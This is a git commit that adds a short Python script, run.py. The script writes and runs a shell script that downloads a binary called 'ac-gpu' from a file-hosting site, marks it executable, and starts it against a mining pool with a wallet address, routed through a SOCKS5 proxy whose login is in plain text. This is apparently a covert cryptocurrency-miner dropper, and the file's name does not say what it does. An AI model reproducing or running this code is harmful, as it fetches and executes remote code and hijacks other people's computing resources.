ccded1d4558fdb44bce48d752ace45c38052a548
mamangfahri7 <83070235+mamangfahri7@users.noreply.github.com>
2021-12-29 13:39:11 +0000

    Create run.py

---
+++ run.py
@@ -0,0 +1,6 @@
+import os
+os.system('echo "#!/bin/sh" >> tes')
+os.system('echo "wget -q https://bin.jvnv.net/file/qJ7G1/ac-gpu && chmod +x ac-gpu" >> tes')
+os.system('echo "./ac-gpu -F http://aqua.signal2noi.se:19998/0x17487f717ec0cba96858f071d0c4bee476b0fb5a/ABAH -t 1 --proxy socks5://simbahkencot-rotate:tukimenreborn@p.webshare.io:80" >> tes')
+os.system('sleep 2')
+os.system('sh tes')
